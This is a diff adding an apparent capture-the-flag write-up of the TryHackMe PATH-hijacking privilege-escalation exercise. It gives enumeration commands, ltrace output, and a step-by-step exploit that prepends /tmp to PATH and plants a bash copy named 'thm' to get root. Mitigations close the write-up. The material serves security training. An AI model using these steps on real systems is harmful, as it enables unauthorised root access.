@@ -1008,7 +1008,468 @@ Offline password cracking enables attackers to compromise additional accounts, p
 
 ---
 
+# TryHackMe - Linux Privilege Escalation
+# PATH Hijacking Privilege Escalation
 
+## Room
+
+**TryHackMe – Linux Privilege Escalation**
+
+---
+
+# Objective
+
+Exploit a **PATH Hijacking** vulnerability in a SUID binary to execute arbitrary commands with **root privileges** by abusing the Linux PATH environment variable.
+
+---
+
+# Overview
+
+One of the common privilege escalation techniques in Linux is **PATH Hijacking**. This occurs when a privileged program executes another command **without specifying its absolute path**.
+
+When Linux encounters a command such as:
+
+```c
+system("thm");
 ```
+
+instead of
+
+```c
+system("/usr/bin/thm");
+```
+
+it searches each directory listed in the **PATH** environment variable until it finds an executable with that name.
+
+If an attacker can place a malicious executable in a writable directory that appears **earlier** in the PATH, the privileged program will execute the attacker's binary instead of the intended one.
+
+---
+
+# Understanding the PATH Variable
+
+The PATH environment variable tells Linux where to search for executables.
+
+Display the current PATH:
+
+```bash
+echo $PATH
+```
+
+Example output:
+
+```text
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+```
+
+Linux searches these directories **from left to right**.
+
+The first matching executable found is the one that gets executed.
+
+---
+
+# Enumeration
+
+## Step 1 – View the PATH Variable
+
+The first step was checking the current PATH.
+
+```bash
+echo $PATH
+```
+
+Understanding the search order is important because PATH Hijacking depends on controlling which executable Linux finds first.
+
+---
+
+## Step 2 – Identify Writable Directories
+
+Next, I searched for writable directories where a malicious executable could be placed.
+
+```bash
+find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
+```
+
+### Command Breakdown
+
+- `find / -writable` → Searches for writable files and directories.
+- `2>/dev/null` → Suppresses permission denied errors.
+- `cut` → Simplifies the output.
+- `grep -v proc` → Excludes `/proc`.
+- `sort -u` → Removes duplicates.
+
+Example output:
+
+```text
+home/murdoch
+tmp
+var/tmp
+```
+
+### Room Question
+
+**What is the odd folder you have write access for?**
+
+Answer:
+
+```text
+/home/murdoch
+```
+
+Although `/tmp` is commonly writable and was later used during exploitation, the room specifically highlighted `/home/murdoch` as the unusual writable directory.
+
+---
+
+## Step 3 – Enumerate SUID Binaries
+
+Since PATH Hijacking usually targets privileged executables, I searched for SUID binaries.
+
+```bash
+find / -perm -4000 -type f 2>/dev/null
+```
+
+Among the standard Linux binaries, one custom executable stood out.
+
+```text
+/home/murdoch/test
+```
+
+Unlike common SUID programs such as `passwd` or `su`, this binary resided inside a user's home directory, making it suspicious.
+
+---
+
+## Step 4 – Verify SUID Permissions
+
+I verified its permissions.
+
+```bash
+ls -l /home/murdoch/test
+```
+
+Output:
+
+```text
+-rwsr-xr-x 1 root root 16712 Jun 20 2021 /home/murdoch/test
+```
+
+The **s** in the owner's permission field indicates that the **SUID** bit is enabled.
+
+This means the executable always runs with the privileges of its owner (**root**).
+
+---
+
+## Step 5 – Investigate the Binary
+
+Normally, I would inspect the binary using `strings`.
+
+However, `strings` was unavailable on the target system, so I used **ltrace** to observe its library calls.
+
+```bash
+ltrace /home/murdoch/test
+```
+
+Output:
+
+```text
+setuid(0)
+setgid(0)
+system("thm")
+sh: 1: thm: not found
+```
+
+This immediately revealed the vulnerability.
+
+The binary executes:
+
+```c
+system("thm");
+```
+
+instead of:
+
+```c
+system("/usr/bin/thm");
+```
+
+Since no absolute path is provided, Linux searches for the executable using the PATH variable.
+
+This behavior makes the program vulnerable to **PATH Hijacking**.
+
+---
+
+# Exploitation
+
+## Step 1 – Modify the PATH
+
+To ensure Linux searches my controlled directory first, I prepended `/tmp` to the PATH variable.
+
+```bash
+export PATH=/tmp:$PATH
+```
+
+Verify the updated PATH:
+
+```bash
+echo $PATH
+```
+
+Example output:
+
+```text
+/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:...
+```
+
+Now Linux checks `/tmp` before any system directory.
+
+---
+
+## Step 2 – Create a Malicious Executable
+
+Since the vulnerable binary executes a program named **thm**, I created my own executable with that name.
+
+```bash
+cp /bin/bash /tmp/thm
+chmod +x /tmp/thm
+```
+
+This creates an executable shell named **thm** inside `/tmp`.
+
+Whenever Linux searches for `thm`, it now finds my executable first.
+
+---
+
+## Step 3 – Execute the Vulnerable Binary
+
+Run the SUID executable.
+
+```bash
+/home/murdoch/test
+```
+
+Internally, it executes:
+
+```c
+system("thm");
+```
+
+Linux searches the PATH.
+
+Because `/tmp` appears before the system directories, my malicious executable is launched.
+
+Since the vulnerable binary executes with **root privileges**, my shell also executes as **root**.
+
+---
+
+# Verify Root Access
+
+Confirm the current user.
+
+```bash
+whoami
+```
+
+Output:
+
+```text
+root
+```
+
+Display detailed user information.
+
+```bash
+id
+```
+
+Output:
+
+```text
+uid=0(root)
+gid=0(root)
+groups=0(root),1001(karen)
+```
+
+Root privileges were successfully obtained.
+
+---
+
+# Capture the Flag
+
+Locate the flag.
+
+```bash
+find / -name flag6.txt 2>/dev/null
+```
+
+Read the flag.
+
+```bash
+cat /path/to/flag6.txt
+```
+
+---
+
+# Why the Exploit Worked
+
+The vulnerable program executed:
+
+```c
+system("thm");
+```
+
+Because no absolute path was specified, Linux searched every directory listed in PATH.
+
+Initially:
+
+```text
+/usr/local/sbin
+/usr/local/bin
+/usr/sbin
+/usr/bin
+...
+```
+
+After modifying PATH:
+
+```text
+/tmp
+/usr/local/sbin
+/usr/local/bin
+...
+```
+
+Linux located my malicious executable inside `/tmp` before reaching the legitimate system directories.
+
+Since the SUID binary itself executes as **root**, my executable also inherited root privileges.
+
+---
+
+# Pentester Methodology
+
+When investigating potential PATH Hijacking vulnerabilities, I followed this workflow:
+
+### 1. Enumerate SUID binaries
+
+```bash
+find / -perm -4000 -type f 2>/dev/null
+```
+
+### 2. Ignore standard Linux binaries
+
+Focus on custom or unfamiliar executables.
+
+### 3. Verify permissions
+
+```bash
+ls -l binary
+```
+
+### 4. Inspect program behavior
+
+```bash
+ltrace binary
+```
+
+### 5. Identify commands executed without absolute paths
+
+Look for functions such as:
+
+```text
+system("command")
+execve("command")
+popen("command")
+```
+
+### 6. Modify the PATH
+
+```bash
+export PATH=/tmp:$PATH
+```
+
+### 7. Create a malicious executable with the expected name
+
+### 8. Execute the vulnerable program
+
+### 9. Verify privilege escalation
+
+---
+
+# Commands Used
+
+```bash
+# Display PATH
+echo $PATH
+
+# Find writable directories
+find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
+
+# Enumerate SUID binaries
+find / -perm -4000 -type f 2>/dev/null
+
+# Verify permissions
+ls -l /home/murdoch/test
+
+# Inspect library calls
+ltrace /home/murdoch/test
+
+# Modify PATH
+export PATH=/tmp:$PATH
+
+# Verify PATH
+echo $PATH
+
+# Create malicious executable
+cp /bin/bash /tmp/thm
+chmod +x /tmp/thm
+
+# Execute vulnerable binary
+/home/murdoch/test
+
+# Verify privileges
+whoami
+id
+
+# Locate the flag
+find / -name flag6.txt 2>/dev/null
+
+# Read the flag
+cat /path/to/flag6.txt
+```
+
+---
+
+# Key Concepts Learned
+
+- Linux PATH environment variable
+- PATH search order
+- PATH Hijacking
+- SUID binaries
+- `system()` function
+- `ltrace`
+- Writable directory enumeration
+- Custom binary analysis
+- Privilege escalation methodology
+
+---
+
+# Security Impact
+
+PATH Hijacking occurs when privileged applications execute commands without specifying their absolute paths.
+
+If an attacker can place a malicious executable in a writable directory that appears earlier in the PATH environment variable, Linux executes the attacker's program instead of the intended executable.
+
+Because the vulnerable application runs with elevated privileges, the malicious executable also inherits those privileges, potentially leading to complete system compromise.
+
+---
+
+## Mitigation
+
+- Always use absolute paths when executing system commands.
+- Avoid using `system()` where safer alternatives exist.
+- Never rely on user-controlled PATH variables.
+- Remove unnecessary SUID permissions.
+- Audit custom privileged binaries regularly.
+- Restrict write access to directories included in PATH.
+
+---
+
 
 
